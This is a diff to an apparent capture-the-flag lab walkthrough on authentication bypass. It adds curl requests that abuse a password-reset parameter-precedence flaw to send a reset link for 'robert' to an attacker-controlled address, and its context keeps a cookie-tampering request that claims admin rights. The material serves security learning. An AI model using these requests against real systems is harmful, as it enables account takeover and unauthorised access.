@@ -120,7 +120,23 @@ In the application, the user account is retrieved using the query string, but la
 
 If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
 
+
+
+<img width="727" height="442" alt="image" src="https://github.com/user-attachments/assets/39361361-2437-4fa8-b2a4-735502c0933c" />
+
+
 By doing this, we can manipulate POST data to override the email address from the query string, thus redirecting the password reset email to address of our choice. 
+
+**Curl Request2**
+
+```
+curl 'http://10.113.155.228/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+```
+
+
+<img width="742" height="441" alt="image" src="https://github.com/user-attachments/assets/e46f3dd5-6abd-42cf-ac44-1d5561c65bd1" />
+
+
 
 
 For Next step, we thus create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of [{username}@customer.acmeitsupport.thm]()
@@ -128,10 +144,15 @@ For Next step, we thus create an account on the Acme IT support customer section
 I used: 
 
 ```
-zazazaza@customer.acmeitsupport.thm
+zazaza@customer.acmeitsupport.thm
 ```
 
-Now rerunning Curl Request 2 but with [zazazaza@customer.acmeitsupport.thm]() in the email field I get a ticket created on my account that I have created which contains a link to log me in as Robert. 
+<img width="742" height="441" alt="image" src="https://github.com/user-attachments/assets/0ab34768-9376-42bf-9c39-d1be32d9d582" />
+
+
+
+
+Now rerunning Curl Request 2 but with [zazaza@customer.acmeitsupport.thm]() in the email field I get a ticket created on my account that I have created which contains a link to log me in as Robert. 
 
 Using Robert's account, I can then view their support tickets and reveal a flag.
 
@@ -143,7 +164,18 @@ Using Robert's account, I can then view their support tickets and reveal a flag.
 curl 'http://10.66.142.45/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=zazazaza@customer.acmeitsupport.thm'
 ```
 
+<img width="727" height="297" alt="image" src="https://github.com/user-attachments/assets/e870ed82-22d5-4036-a1b2-b403b58edb11" />
 
+I view the ticket in my account:
+
+<img width="703" height="386" alt="image" src="https://github.com/user-attachments/assets/281e137c-6cae-4bed-aeaf-d8ba84069558" />
+
+I get a reset password URL that i can use to login to Robert's account:
+
+<img width="751" height="416" alt="image" src="https://github.com/user-attachments/assets/19049635-1e1f-4844-97d5-9901a4b28a8f" />
+
+
+Using Robert's account, I can then view the support tickets and reveal a flag.
 
  ---
  
@@ -174,3 +206,4 @@ curl -H "Cookie: logged_in=true; admin=true" http://10.66.142.45/cookie-test
 
 
 <img width="677" height="127" alt="image" src="https://github.com/user-attachments/assets/324ed8b6-1331-49bf-bfb8-daa2fa12fc6f" />
+
